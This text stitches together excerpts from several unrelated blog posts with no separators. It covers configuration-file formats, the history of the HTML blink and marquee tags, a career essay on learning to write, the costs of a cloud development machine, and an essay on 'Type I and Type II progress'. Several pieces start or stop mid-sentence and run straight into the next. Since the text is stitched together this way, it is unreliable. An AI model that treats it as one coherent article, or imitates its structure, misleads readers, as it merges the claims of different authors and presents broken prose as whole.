  <li><a href="https://en.wikipedia.org/wiki/Windows_Registry">The Windows Registry</a></li>
  <li><a href="https://en.wikipedia.org/wiki/Debian_configuration_system">The Debian Configuration system</a></li>
  <li><a href="https://en.wikipedia.org/wiki/System_Preferences">macOS’ Systems Preferences</a></li>
</ul>

<p>But we won’t discuss those here.</p>

<p>Plain text configuration files have distinct benefits that make them especially
appealing to anyone concerned with programmability (which should probably be
everyone, given the ineluctable force of the <a href="https://en.wikipedia.org/wiki/Digital_Revolution">digital
revolution</a>):</p>

<ul>
  <li>There’s no need to build an additional UI for configuration, since
a user-author’s text editor suffices.</li>
  <li>Configuration files are easy to duplicate, share, and place under version
control.</li>
  <li>Configuration files are easy to read and analyze, so user-authors can use them
in ways not initially anticipated.</li>
  <li>Configuration files are easy to write and generate, so user-authors can
program the configuration of their programs.</li>
  <li>Programmable computers are fundamentally about reading and rewriting
(“According to my  definition,” Turing <a href="https://www.cs.virginia.edu/~robins/Turing_Paper_1936.pdf">wrote</a>, “a
number is computable if its decimal can be written down by a machine”) and it
is empowering and illuminating to cleave to foundations, when that will do.</li>
</ul>



<p>We see three approaches to file-based configuration predominating today. Each
has its advantages, but also significant downsides.</p>



<p>These formats are generally limited to very simple key-value pairs. Users of
Unix-like operating systems have likely encountered this species in a <code>.cnf</code>,
<code>.conf</code>, <code>.cfg</code> or <code>.ini</code> file.</p>

<p>These are generally easy for humans to read and write, but are not standardized,
and not a good choice for configurations of any complex or deeply nested
attributes. The lack of principled format and standardization also means they
are less susceptible to elegant or reliable generation. Since we take for
granted that user authors should be able to program the configurations of their
programs, this is a serious shortcoming.</p>

<p><a href="https://github.com/toml-lang/toml">TOML</a> is an interesting configuration format in this space, since it is
designed to provide the easy readability of key-value pair <a href="https://en.wikipedia.org/wiki/INI_file">INI
files</a>, but it can support nested structures – up to a point. One
hits this point <a href="https://github.com/avakar/pytoml/issues/15#issuecomment-217739462">sooner rather than later</a>, however. It
can also be tricky to reason about the scoping rules of the format, and
challenging to generate non-trivial TOML configurations programmatically, and
one can find <a href="https://hitchdev.com/strictyaml/why-not/toml/">plenty of other gripes besides</a>.</p>

<h2 id="configuration-via-data-serialization-formats">Configuration via Data-Serialization Formats</h2>

<p>It has become common practice to use human-readable <a href="https://en.wikipedia.org/wiki/Comparison_of_data-serialization_formats">data-serialization
formats</a> (JSON, YAML, XML, S-Expressions) for application and infrastructure
configuration. While this has certain conveniences (e.g., there is a measure of
transparency), we believe that this approach is suboptimal for plain text
configuration management via configuration files.</p>

<p>In a plain text, open source environment, configuration files are the high-level
interfaces that user-authors touch when shaping their programs to suit their
needs. In contrast, data-serialization formats are – and should be – focused
on machine readability and optimized for data exchange between programs. There
is an impedance mismatch between the aims of data-serialization formats and the
needs of the humans who configure programs.</p>

<p>We see the symptoms of this mismatch all around us. The most obvious sign is the
<a href="https://en.wikipedia.org/wiki/Neoplasm">neoplastic</a> growth of configuration schemes for non-trivial programs, driven
by the inadequacy of data-serialization formats for the task of user-author
configuration. E.g.,</p>

<ul>
  <li>HCL’s <a href="https://www.terraform.io/docs/configuration-0-11/interpolation.html">string interpolation language</a>, born from JSON</li>
  <li>CircleCI’s <a href="https://circleci.com/docs/2.0/reusing-config/#section=configuration">YAML-based programming language</a></li>
  <li>SaltStack’s <a href="https://docs.saltstack.com/en/latest/ref/configuration/examples.html#example-minion-configuration-file">YAML-based surface syntax for Python</a></li>
  <li>Judging by its <a href="https://yaml.org/spec/1.2/spec.html">monstrous spec</a> YAML is itself a symptom of this
mismatch.</li>
  <li><a href="https://en.wikipedia.org/wiki/XML">XML</a> is widely reviled as a configuration format, because, while it is
an excellent extensible markup language, it makes for a very noisy and verbose
configuration syntax and, as a data exchange format, it has no advantages over
s-expressions.</li>
</ul>

<h2 id="configuration-via-a-general-purpose-language">Configuration via a General Purpose Language</h2>

<p>A common alternative is to use a general purpose programming language for
configuration. E.g.,</p>

<ul>
  <li><a href="https://en.wikipedia.org/wiki/Run_commands">Run commands files</a> (like <code>.bashrc</code> or <code>.zshrc</code>)</li>
  <li><a href="https://packaging.python.org/tutorials/packaging-projects/">Python’s packaging</a></li>
  <li>Elixir’s <a href="https://hex.pm/docs/usage">Hex</a> packaging system</li>
  <li>Scala’s <a href="https://www.scala-sbt.org/">SBT</a> build system</li>
</ul>

<p>Since general purpose programming languages are designed to enable humans to
specify and communicate mechanizable programs, this approach doesn’t suffer the
same problems as data-serialization formats. Instead, it suffers from a dual
problem: whereas data-serialization formats are too static and inexpressive,
general purpose programming language are too dynamic and expressive.</p>

<p>An application designer would generally like to specify the API of their
configuration system narrowly, to ensure predictable and well defined behavior.

    <p>I was chatting with a fellow web developer recently and made a joke about the <abbr title="Hypertext Markup Language">HTML</abbr> <code>&lt;blink&gt;</code> and <code>&lt;marquee&gt;</code> tags, only to discover that he had no idea what I was talking about. They’re a part of web history that’s fallen off the radar and younger developers are unlikely to have ever come across them. But for a little while, back in the 90s, they were a big deal.</p>

<p>Invention of the <code>&lt;blink&gt;</code> element is often credited to <a href="https://montulli.blogspot.com/">Lou Montulli</a>, who wrote pioneering web browser <a href="https://lynx.invisible-island.net/">Lynx</a> before being joining Netscape in 1994. <a href="http://www.montulli.org/theoriginofthe%3Cblink%3Etag">He insists that he didn’t write any of the code</a> that eventually became the first implementation of <code>&lt;blink&gt;</code>. Instead, he claims: while out at a bar (on the evening he’d first meet his wife!), he pointed out that many of the fancy new stylistic elements the other Netscape engineers were proposing wouldn’t work in Lynx, which is a text-only browser. The fanciest conceivable effect that would work across both browsers would be making the text flash on and off, he joked. Then another engineer – who he doesn’t identify – pulled a late night hack session and added it.</p>
<p>And so it was that <a href="https://www.webdesignmuseum.org/old-software/web-browsers/netscape-navigator-2-0">when Netscape Navigator 2.0 was released in 1995</a> it added support for the <code>&lt;blink&gt;</code> tag. Also animated <abbr title="Graphics Interchange Format (file)s">GIFs</abbr> and the first inklings of JavaScript, which collectively would go on to <em>define</em> the “personal website” experience for years to come. Here’s how you’d use it:</p>
<pre><code>&lt;BLINK&gt;This is my blinking text!&lt;/BLINK&gt;</code></pre>
<p>With no attributes, it was clear from the outset that this tag was supposed to be a joke. By the time <abbr title="Hypertext Markup Language, version 4">HTML4</abbr> was published as a a recommendation two years later, <a href="https://www.w3.org/Style/HTML40-plus-blink.dtd">it was <em>documented</em> as being a joke</a>. But the Web of the late 1990s saw it used <em>a lot</em>. If you wanted somebody to notice the “latest updates” section on your personal home page, you’d wrap a <code>&lt;blink&gt;</code> tag around the title (or, if you were a sadist, the entire block).</p>

<p>In the same year as Netscape Navigator 2.0 was released, <a href="https://www.webdesignmuseum.org/old-software/web-browsers/internet-explorer-2-0">Microsoft released Internet Explorer 2.0</a>. At this point, Internet Explorer was still very-much playing catch-up with the features the Netscape team had implemented, but clearly some senior Microsoft engineer took a look at the <code>&lt;blink&gt;</code> tag, refused to play along with the joke, but had an innovation of their own: the <code>&lt;marquee&gt;</code> tag! It had <a href="http://www.lissaexplains.com/fun3.shtml">a whole suite of attributes</a> to control the scroll direction, speed, and whether it looped or bounced backwards and forwards. While <code>&lt;blink&gt;</code> encouraged disgusting and inaccessible design as a joke, <code>&lt;marquee&gt;</code> did it on purpose.</p>
<pre><code>&lt;MARQUEE&gt;Oh my god this still works in most modern browsers!&lt;/MARQUEE&gt;</code></pre>
<blockquote><p><marquee>Oh my god this still works in most modern browsers!</marquee></p>

</blockquote>
<p>But here’s the interesting bit: for a while in the late 1990s, it became a somewhat common practice to wrap content that you wanted to emphasise with animation in <em>both</em> a <code>&lt;blink&gt;</code> and a <code>&lt;marquee&gt;</code> tag. That way, the Netscape users would see it flash, the <abbr title="Internet Explorer">IE</abbr> users would see it scroll or bounce. Like this:</p>
<pre><code>&lt;MARQUEE&gt;&lt;BLINK&gt;This is my really important message!&lt;/BLINK&gt;&lt;/MARQUEE&gt;</code></pre>
<figure id="attachment_17887" aria-describedby="caption-attachment-17887"><a href="https://danq.me/wp-content/uploads/2020/11/IE5.gif"><img loading="lazy" src="https://danq.me/wp-content/uploads/2020/11/IE5.gif" alt="Internet Explorer 5 showing a marquee effect." width="640" height="480" data-old-src="https://danq.me/wp-content/uploads/2020/11/xIE5-30x23.gif.pagespeed.ic.V9MhE6Bblw.jpg"></a><figcaption id="caption-attachment-17887">Wrap a <code>&lt;blink&gt;</code> inside a <code>&lt;marquee&gt;</code> and <abbr title="Internet Explorer">IE</abbr> users will see the marquee. Delightful.</figcaption></figure>
<p>The web has always been built on <a href="https://en.wikipedia.org/wiki/Robustness_principle">Postel’s Law</a>: a web browser should assume that it won’t understand everything it reads, but it should provide a best-effort rendering for the benefit of its user anyway. Ever wondered why the modern <code>&lt;video&gt;</code> element is a block rather than a self-closing tag? It’s so you can embed <em>within</em> it code that an earlier browser – one that doesn’t understand <code>&lt;video&gt;</code> – can read (a browser’s default state when seeing a new element it doesn’t understand is to ignore it and carry on). So embedding a <code>&lt;blink&gt;</code> in a <code>&lt;marquee&gt;</code> gave you the best of both worlds, right? <em>(welll…)</em></p>
<figure id="attachment_17889" aria-describedby="caption-attachment-17889"><a href="https://danq.me/wp-content/uploads/2020/11/Netscape5.gif"><img loading="lazy" src="https://danq.me/wp-content/uploads/2020/11/Netscape5.gif" alt="Netscape Navigator 5 showing a blink effect." width="640" height="480" data-old-src="https://danq.me/wp-content/uploads/2020/11/xNetscape5-30x23.gif.pagespeed.ic.7MCcOVo4rn.jpg"></a><figcaption id="caption-attachment-17889">Wrap a <code>&lt;blink&gt;</code> inside a <code>&lt;marquee&gt;</code> and Netscape users will see the blink. Joy.</figcaption></figure>
<p>Better yet, you were safe in the knowledge that anybody using a browser that didn’t understand <em>either</em> of these tags could <em>still read your content</em>. Used properly, the web is about <em>progressive enhancement</em>. Implement for everybody, enhance for those who support the shiny features. JavaScript and <abbr title="Cascading Style Sheets">CSS</abbr> can be applied with the same rules, and doing so pays dividends in maintainability and accessibility (though, sadly, that doesn’t stop people writing sites that needlessly <em>require</em> these technologies).</p>
<figure id="attachment_17891" aria-describedby="caption-attachment-17891"><a href="https://danq.me/wp-content/uploads/2020/11/Opera5.gif"><img loading="lazy" src="https://danq.me/wp-content/uploads/2020/11/Opera5.gif" alt="Opera 5 showing no blinking nor marquee text." width="640" height="480" data-old-src="https://danq.me/wp-content/uploads/2020/11/xOpera5-30x23.gif.pagespeed.ic.lyeZs3hC1_.jpg"></a><figcaption id="caption-attachment-17891">Personally, I was a (paying! – back when people used to pay for web browsers!) Opera user so I mostly saw neither <code>&lt;blink&gt;</code> nor <code>&lt;marquee&gt;</code> elements. I don’t feel like I missed out.</figcaption></figure>
<p>I remember, though, the first time I tried Netscape 7, in 2002. Netscape 7 and its close descendent are, as far as I can tell, the only web browsers to support <em>both</em> <code>&lt;blink&gt;</code> and <code>&lt;marquee&gt;</code>. Even then, it was picky about the order in which they were presented and the elements wrapped-within them. But support was good enough that some people’s personal web pages suddenly began to exhibit the most ugly effect imaginable: the combination of both scrolling and flashing text.</p>
<figure id="attachment_17892" aria-describedby="caption-attachment-17892"><a href="https://danq.me/wp-content/uploads/2020/11/Netscape7.gif"><img loading="lazy" src="https://danq.me/wp-content/uploads/2020/11/Netscape7.gif" alt="Netscape 7 showing text that both blinks and marquee-scrolls." width="640" height="480" data-old-src="https://danq.me/wp-content/uploads/2020/11/xNetscape7-30x23.gif.pagespeed.ic.2Feg-ZbrR7.jpg"></a><figcaption id="caption-attachment-17892">If Netscape 7’s <abbr title="User Interface">UI</abbr> didn’t already make your eyes bleed (I’ve toned it down here by installing the “classic skin”), its simultaneous rendering of <code>&lt;blink&gt;</code> and <code>&lt;marquee&gt;</code> would.</figcaption></figure>
<p>The <code>&lt;blink&gt;</code> tag is very-definitely <a href="https://caniuse.com/?search=blink">dead</a> (<a href="http://tstbtbt.com/">hurrah!</a>), but you can <a href="https://www.w3docs.com/snippets/css/how-to-create-a-blinking-effect-with-css3-animations.html">bring it back with pure&nbsp;</a><abbr title="Cascading Style Sheets"><a href="https://www.w3docs.com/snippets/css/how-to-create-a-blinking-effect-with-css3-animations.html">CSS</a></abbr> if you must. <code>&lt;marquee&gt;</code>, amazingly, still <a href="https://caniuse.com/?search=marquee">survives</a>, not only in <a href="https://remysharp.com/2008/09/10/the-silky-smooth-marquee/">polyfills</a> but <em>natively</em>, as you might be able to see above. However, if you’re in any doubt as to whether or not you should use it: you shouldn’t. If you’re looking for digital nostalgia, <a href="https://theoutline.com/post/8442/internet-nostalgia-2010s-geocities-tumblr-vaporwave">there’s a whole rabbit hole to dive down</a>, but you don’t need to inflict <code>&lt;marquee&gt;</code> on the rest of us.</p>

But in the past 30 years, reading and writing has overtaken it as the primary mode of communication.</p><figure><img src="https://www.nityesh.com/content/images/2020/11/image.png" alt="" srcset="https://www.nityesh.com/content/images/size/w600/2020/11/image.png 600w, https://www.nityesh.com/content/images/size/w1000/2020/11/image.png 1000w, https://www.nityesh.com/content/images/2020/11/image.png 1600w" sizes="(min-width: 720px) 720px"><figcaption>The Writing Revolution</figcaption></figure><p>You are now living in the early years of a Writing Revolution that has changed the way humans communicate with each other.</p><p>Traditional education, however, has failed to recognise this human-scale revolution - good writing tuitions are still reserved for students of the liberal arts.</p><p>You cannot wait for traditional education to catch up when being a good writer can benefit your career now. </p><p>Especially, with the remote-working revolution underway.</p><h2 id="the-remote-working-revolution">The Remote-Working Revolution</h2><p>Some of the biggest companies of our generation like Facebook, Twitter and Shopify have recently announced a permanent transition to remote working. Inevitably, they have paved the path for entire industries to follow.</p><p>Therefore, it's highly likely that your next company will be working remotely.</p><p>In remote settings, with little face-to-face interaction, written communication becomes the key.</p><h3 id="your-competitive-advantage-in-a-tough-job-market">Your competitive advantage in a tough job market</h3><p>Work-from-home means that the competitors for your next job are not just from your city, they are from your entire country and potentially the whole world. Add economic depression and rock bottom unemployment rates to the mix, and you have a saturated job market.</p><p>You need to find a way to stand out.</p><p>Being a good writer will help you. </p><p>When deciding between a few candidates to fill a position, companies like Basecamp hire the better writer. People of Basecamp have been working remotely for more than 20 years and great writing is a <a href="https://basecamp.com/gettingreal/08.6-wordsmiths">prerequisite</a> for every single position they have.</p><p>Being a good writer helps you get a new job. A better job.</p><p>But more importantly, it helps you do your everyday work better and therefore, changes the arc of your entire career!</p><figure><img src="https://www.nityesh.com/content/images/2020/11/Career-boost.jpg" alt="" srcset="https://www.nityesh.com/content/images/size/w600/2020/11/Career-boost.jpg 600w, https://www.nityesh.com/content/images/size/w1000/2020/11/Career-boost.jpg 1000w, https://www.nityesh.com/content/images/size/w1600/2020/11/Career-boost.jpg 1600w, https://www.nityesh.com/content/images/2020/11/Career-boost.jpg 2048w" sizes="(min-width: 720px) 720px"><figcaption>Effect of good writing skills on the progress in your career</figcaption></figure><p>Here are 3 ways it boosts your career:</p><p><strong>1. Grabbing the valuable attention of people around you</strong></p><ul><li>You need your peers to read that awesome idea you propose.</li><li>You need your subordinates to pay attention to you.</li><li>You need hiring managers to read your next job application.</li><li>You need interesting people, that you admire, to read and answer your cold emails.</li><li>You need your connections on LinkedIn or Twitter to pay attention to your posts - we all know, better connections mean better opportunities.</li></ul><p>Yet, you can't rely on the awesomeness of your ideas to grab their attention. Everyone has loads of them.</p><p>What differentiates successful people is their ability to convey their ideas in ways that makes people want to pay attention.</p><blockquote><em><em><em>"Being a good writer is about more than writing. Clear writing is a sign of clear thinking. Great writers know how to communicate. They make things easy to understand. They can put themselves in someone else’s shoes. They know what to omit."</em></em></em><p><em>- David Heinemeier Hanson and Jason Fried, founders of Basecamp</em></p></blockquote><p><strong>2. Finding new career opportunities</strong></p><p>Writing on the Internet can advance your career. A well-written article, published on the Internet, works 24 hours a day, 365 days a year to find new opportunities for you!</p><p>Therefore, your blog is like a resume, only better.</p><figure><blockquote data-width="550"><div lang="en" dir="ltr"><p>Having seen this from both sides of the table: a great essay is a much better window into a candidate’s ability than any resume and most full interview packets.</p><p>Also, unlike resumes, senior people read them for fun and start outbound hiring conversations based on them. <a href="https://t.co/FOEDqtKt7k">https://t.co/FOEDqtKt7k</a></p></div>— Patrick McKenzie (@patio11) <a href="https://twitter.com/patio11/status/1290854152277389313?ref_src=twsrc%5Etfw">August 5, 2020</a></blockquote>

</figure><p>Writing a useful article is the quickest way to establish yourself as an expert in that field. No degrees required.</p><p>Two years ago, I wrote an article to help people get started with <a href="https://nityesh.com/getting-started-reading-research-papers-dl/">reading Deep Learning research papers</a>. It still fetches me LinkedIn connections from PhDs in universities around the world. Funny thing is that I have read only one research paper in my life - when I wrote the article!</p><blockquote><em><em><em>"By making it easy for people to find you online, you’ll create a vehicle for serendipity."</em></em></em><p><em>- David Perell, creator of the popular course Write of Passage</em></p></blockquote><p>Good online presence allows you to connect with like-minded people around the world, who you would never be able to meet in real life. And meaningful social connections are often the source of surreal career opportunities.</p><p><strong>3. Improving your thinking</strong></p><blockquote><em>"You don’t just write to share what you think. You write to discover what you think in the first place."</em><p><em>- Matt Mullenweg, CEO of Automattic, the company behind Wordpress</em></p></blockquote><p>Compressing your thoughts into the written word removes noise from your thoughts. Clear writing induces clear thinking.</p><p>This is why Jeff Bezos makes his executives prepare <a href="https://www.sec.gov/Archives/edgar/data/1018724/000119312518121161/d456916dex991.htm">6-page narratives</a> instead of 20-slide Powerpoint before any meeting. Bezos believes that Powerpoint presentations conceal lazy thinking. Instead, he wants his employees to think deeply and take the time to express their thoughts cogently.</p><p>I'm often amazed to see how writing an idea leaves me with a better version of the idea itself. It makes me realise how sloppy my thinking usually is.</p><p>Writing clearly can have the same effect on your thinking too. </p><figure><img src="https://www.nityesh.com/content/images/2020/11/image-1.png" alt="" srcset="https://www.nityesh.com/content/images/size/w600/2020/11/image-1.png 600w, https://www.nityesh.com/content/images/size/w1000/2020/11/image-1.png 1000w, https://www.nityesh.com/content/images/2020/11/image-1.png 1600w" sizes="(min-width: 720px) 720px"><figcaption>These 3 benefits create a self-sustaining flywheel that accelerates your career</figcaption></figure><p>So, how do you start?</p><p>You've probably taken writing lessons in school.</p><p>And yet, so much of what school teaches you is worse than useless. It hurts you in real life. You need to unlearn so much if you want to write meaningful things in real life.</p><p>Here are some of the things that school made you do in order to get respectable grades:</p><ul><li>You followed minimum word limits. Whereas, the real world has maximum word limits - the key is to convey your message in as few words as possible.</li><li>You followed rigid formats for "creative" writing. There was a format for essays, formal letters and even, informal letters! Well, guess what? Nobody likes it when you are formulaic and everyone loves being surprised.</li><li>You wrote an introductory paragraph before you made your point. Whereas, in the real world, your first sentence needs to grab the reader. Nobody has the time to read an introduction to your main content.</li><li>You wrote what was prescribed instead of what you wanted. You never realized that you write your best when you write about something that you are excited about.</li></ul><figure><img src="https://www.nityesh.com/content/images/2020/11/image-2.png" alt="" srcset="https://www.nityesh.com/content/images/size/w600/2020/11/image-2.png 600w, https://www.nityesh.com/content/images/size/w1000/2020/11/image-2.png 1000w, https://www.nityesh.com/content/images/2020/11/image-2.png 1600w" sizes="(min-width: 720px) 720px"><figcaption>No one told you that too much focus on getting good at school can actually do you harm</figcaption></figure><p>There are writing courses all over the Internet that promise to turn you into a successful author or a professional blogger.</p><p><em><em>Oh, that dream of writing like a pro and monetising your words!</em></em></p><p>But wait, most of us don't aspire to be a professional writer. </p><p>You probably want to be an pragmatic programmer, an insightful data scientist, a great manager or maybe a successful entrepreneur. Don't you?</p><p>By connecting an incredibly useful skill with a dreamy aspiration, those guides miss the point of writing well.</p><p><strong>Learning to write well is about learning to convey your thoughts to others.</strong></p><p>Explaining things is an art. It is the art of getting your argument across. You cannot hope to learn that in a vaccum.

<h2>Cost</h2>
<p><strong>EBS-$0.10 / GB month</strong></p>
<p><strong>EC2-$0.0104 / hour</strong></p>
<p>Cost was a big consideration for me when designing and using this system. This solution is free under AWS Free Tier, but that doesn’t last forever.</p>
<p>As seen below, if you terminate your instance when you are done using it, you’ll run a little over $0.01 an hour. It’ll run you $0.46 a week at 40 hours a week, $1.84 a month, and $22.10 a year, all assuming you are running the instance for 40 hours a week.</p>

<h2>Portability</h2>
<p>I use a free version of <a href="https://terminus.com/">Terminus</a> on all my devices. I can’t recommend Terminus enough, it is a fantastic product.</p>
<p>Using cloud computing also lets me centralize all my secrets. I don’t need to make a new IAM User or API Keys for myself when I get a new machine.</p>
<h2>Experimenting</h2>
<p><img src="https://imgs.xkcd.com/comics/python_environment.png" alt="Python Environment XKCD Comic"></p>
<p>Treating my development machines as Cattle instead of Pets lets me experiment freely.</p>
<p>I never have to worry about breaking my python environment.</p>
<h2>AMD64 vs ARM64</h2>
<p><a href="https://twitter.com/frmr_m/status/1325984164752011265">This tweet</a> brought up an interesting point, with new Mac Laptops running on ARM CPUs, local testing becomes more complicated.</p>
<blockquote>
<p>The impending Dockerpocolypse. Specifically I realized with a mixed architecture k8s cluster that finding images that work on both amd64 and arm64 is not as easy as I’d hope. So what happens when Macs start shipping arm chips?</p>
</blockquote>

        <h4 id="or-the-tale-of-why-we-can-both-go-to-mars-and-save-the-world">(Or: the tale of why we can both go to Mars and save the world)</h4>

<p>Imagine human capability as a high dimensional blob.<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>  There are some people who live on the surface of the blob (let’s call it the capability frontier ) - they have access to the best of the knowledge and resources humanity has to offer. <em>Pushing this frontier and expanding maximum possible capabilities is Type I Progress</em>.</p>

<p><img src="https://lh3.googleusercontent.com/v7YtSoUqTzwIAkFUQeN06AtVwqHazuySotlmrI1thsCMDx8bAh1dnL2-G2KPyQ15NQqNRG9s1yHnIXsoXb6NHgkrrKI9WKnJGCCbtmOoVvRi_7xIVYT7OOWl7tZDCJJx00OKE4F-DnNZhhzsxqmq2cZGoVIc_sLvSxXv6qUH3cJiELraDztvEY1gxmHTy_trBFOIxpS53GlEkAq257PuYYvFxGjiUtuQxQpj4U7gPo0zwWD8L64eE-dnQmaW_ZEgxMi5s45LjvDYeOz12gdYB8zJZEoZRkHOxIcHWBte55YWpXi_JXTJuEKeE427ZU-ZbPbvCzf7YTvfL2q6U4xiaC9ue9Z_ec0l0KoIlCNuOkhKAZZXTsmI6tMZ5AMeNFAjPUG8utDG5ZbjEhHUaudUGu_5lfbG2E8TJBWgNq72MP9M3lIP-leSkIkmCkzPazEcBDDoRi-0C8OlgsdlbPcWVArgtarrzYcWP14nWa9gP0oGKUmjClh1rGY51YI5FEhKNMrBmrlXLwS9X_yxFY3LfOCDvmXsIXIszm8OVETrIXtbiU-SqMAjgnr-PkUjfIGFIa3cX_tZSr5s2KkQqP5ZwOBnsVCpFKsXd2XzBq4kgQwNota4h4D4aSJNmaHatPhSGywGtDEEyEpCz0KhGiK7OrO1o8hLfuY2a6F5p53NhP0SNB1_lxl3CSFhu3Vmqam1ULTnrDemeO2So6Ri3aIULsTPgmeQkq9e0gG-S7Mc6migYdXSrg=w898-h947-no">
  </p>

<p>There are many people who don’t live on the surface of the capability blob - most people who live in ‘developing’ nations, for example.  <em>Actions that expand these people’s capabilities towards the frontier are Type II Progress</em>.</p>

<p>Per William Gibson: <a href="https://en.wikiquote.org/wiki/William_Gibson">“The future is here — it’s just not very evenly distributed.”</a> You could think of Type I progress as expanding what the future is, and Type II progress as distributing that future.</p>

<p><a href="http://matt.might.net/articles/phd-school-in-pictures/">There are even some people who might live a little beyond the surface in some dimensions. These are the innovators, the creators of new knowledge.</a></p>

<p>This chart of farm output over time is a great example of Type I and II progress:</p>
<p><img src="https://i.imgur.com/7bwKDFY.png">
</p>
<p>Here’s a simplified version of the above chart.</p>
<p><img src="https://lh3.googleusercontent.com/KnjVQiEJKUa5n-saje01_MSCME3XOgtKkt6pMV4E8C-pILQkh2axGI_Y7hO2gmL0PdVanhGsUX78qu0YJa9uZrfmhRwY1LrfZWdW4srlsn8LYciadYNfozpT-jviqkG7eJRWQY09h65xhv4T1TfYtdu_TuEHSic-5iA7DzhdwBcmpw89r-FSQ4Vv2BU5DGcsJlX9adCinYGF9r8rRjk0IV4lmQ-7303dI36qQqM8bCBWv2SYK55Y8HPczPt5dohXIcN0pUcjF8Tso9Kxr9W4ZsbILFmIHhrznUPESC51CfqeYNIOcvG_zdlLot1LQKNjgWiqGj7dg6sq0AHfkn0pzwmniu1JS2r5i4h6YtWFFI0d64d9aH5jPfdZbTlIDi3O3qY5s-b4wVAuZA5xPaPJ_P7N9a_JkR-7PH_vcecEN2_6BtFXVtp7XPVMbiPke1pVsVWqHVkxMgHDbABY8Vm7E-tM_Fwv7f7Ki6SOTY54H7H9c6LJQaHwEPHcIqxSwpmVvwMhXV4u492hVW0OzP25NLmi3zfUNSIBoz8MmrPej7_iQXvhT59-MVkNBQV7yD79xDldiZh2yLBP1gTyEtK723gLIjq9rjF9b_VK8JXKaLZO63hQJN4jMYZxWWjmZsFyZWq7chyuhfZtwTVRhrWR9az5noKVGkG8FP3ga5Pl28QWZitrjC4kAmITAvapE6usPTXUQXFOzKS_KyKDmqdn6-CkN-0gjIcpGjHyhZ2J-hgkROd27w=w1483-h804-no">
</p>

<p>You can see how from 1960 to 2006 Northeast Asia and
North America were pushing the capability frontier forward (on the total possible output per hectare and total output per worker respectively.)  China as a whole clearly made progress but stayed well within the capability frontier.</p>

<p>Mokyr puts it well in <a href="https://www.amazon.com/Lever-Riches-Technological-Creativity-Economic/dp/0195074777">Lever of Riches</a>:</p>

<p><code>“At any moment there is a large gap between average and best practice technology; reducing this gap by disseminating the techniques used by producers at the cutting edge of knowledge is technological progress without invention.” </code></p>

<p>Type II progress is this “progress without invention.”</p>

<p>This distinction may seem trivial but Type I and Type II progress are often talked about in the same context.  Explicitly calling out the distinction between Type I and Type II progress and thinking about them separately will lead to more action.</p>

<p>In many recent progress-related discussions you often see people who lean towards one type of progress over another talking past each other, and I want to unblock that logjam.</p>

<p>This piece will break down why people confuse Type I and Type II progress (especially rapid Type II progress.) One big confusion-causer is the fact that progress frontiers are geographically fractal which has several implications.</p>

<p>Once we’ve disentangled the two flavors of progress, I will try to convince you that there are strong arguments for spending time and money on both so everybody can stop wasting time debating which is more worthy.</p>

<h2 id="type-i-and-type-ii-progress-are-often-confused">Type I and Type II progress are often confused.</h2>

<p>People often confuse rapid Type II progress for Type I progress. This is in part because</p>

<h3 id="progress-frontiers-are-geographically-fractal">Progress frontiers are geographically fractal.</h3>

<p>Every time you zoom in on a fractal, it presents the same pattern on a different scale. This scale invariance makes it impossible to cleanly separate between places that would benefit from Type I vs Type II progress.</p>

<p>In the United States you would expect California to be right on the frontier - it’s the wealthiest state with progressive policies and hordes of people trying to build the future. Yet there are still hundreds of thousands of farm workers who live lives comparable to residents of developing nations - they clearly are not at the frontier and would benefit more from Type II progress than Type I progress.</p>

<p>Zoom in farther to the San Francisco Bay Area. In only a few square miles there are people pushing the limits of quantum technology living with infrastructure and policies that look like something out of a developing nation.<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup></p>

<p>You can’t even say that individuals are the quanta where you can draw a clean line between where Type I vs. Type II progress happens. Many researchers on the cutting edge of science follow discredited dietary guidelines from the 1970’s.</p>

<p>This inability to cleanly separate the two types of progress geographically adds evidence to the fact that  <em>“Should we focus on Type I or Type II progress?”</em> is the wrong question.</p>

<p>Another consequence of this fractal nature of progress is that</p>

<h3 id="type-i-and-type-ii-progress-dont-correspond-11-with-developed-and-developing-nations">Type I and Type II progress don’t correspond 1:1 with developed and developing nations.</h3>

<p>Let’s look at the opposite statement “Type I and Type II progress correspond 1:1 to developed and developing nations.”</p>

<p>There are parts of China (Shanghai, Beijing) that are expanding human knowledge and capability - building new augmented reality technology, CRISPRing Babies, etc. But then there are also parts of China that don’t have indoor plumbing.</p>

<p>And as already mentioned, there are even parts of the United States that do not have indoor plumbing or consistent electricity, let alone ride-sharing, etc.</p>

<p>That isn’t to say that the knowledge frontier and developed nation status are uncorrelated. It is simply harder to spend time advancing the future when there are fewer people with all the knowledge and abilities that are at the frontier.  At the end of the day Type I progress is easier to do in developed nations.</p>

<p>New technology requires previous infrastructure.  Take the “Connecticut Yankee” scenario - if you dropped even the most experienced team of engineers in medieval Europe, they would be hard-pressed to create anything useful without modern tools, and supply chains.  Additionally, “process knowledge” - the nitty-gritty subtleties of building things that are near-impossible to transmit via writing may be even more important than physical infrastructure.<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">3</a></sup></p>

<p>A stronger statement is that</p>

<h3 id="you-can-only-push-the-frontier-on-dimensions-where-you-are-at-the-frontier">You can only push the frontier on dimensions where you are at the frontier</h3>
<p>Many people point to China and countries in Africa “technologically leapfrogging” the United States.  The flagship evidence is Chinese mobile payments and cell phone propagation in Africa.</p>

<p>However, this evidence is not a sign that those places will soon eclipse the US technologically. Precision is essential when we’re talking about the technological frontier. These places can push the frontier <em>on those dimensions</em> - mobile payments and mobile phones as the computing center.</p>

<p>It might ruffle some feathers but this argument suggests that developed nations should prioritize Type I progress while developing nations should prioritize Type II progress.</p>

<h2 id="disentangling-type-i-and-type-ii">Disentangling Type I and Type II</h2>
<p>There is a lot of explicit and (more insidiously) implicit discussion about which type of progress is more important. But “Should we focus on Type I or Type II progress?” is the wrong question. Debating the abstract relative merits of Type I and Type II progress is a waste of time .</p>

<h3 id="why-should-we-focus-on-type-i-or-type-ii-progress-is-the-wrong-question">Why “Should we focus on Type I or Type II progress?” is the wrong question</h3>

<p>Because progress frontiers are geographically fractal you need to specify the scale and location you’re talking about. Then you will be able to say “at this scale and location what would be the result of a focus on Type I vs Type II progress?” <sup id="fnref:3" role="doc-noteref"><a href="#fn:3">4</a></sup>  As already mentioned, Type I progress is easier to do in developed nations and its only possible to make progress along dimensions where you are already on the frontier.</p>

<p>Organizations can then decide what they should focus on based on their specific scale, location, and mandate. For example, a sub-saharan African nation should not be spending money on a national science program.</p>

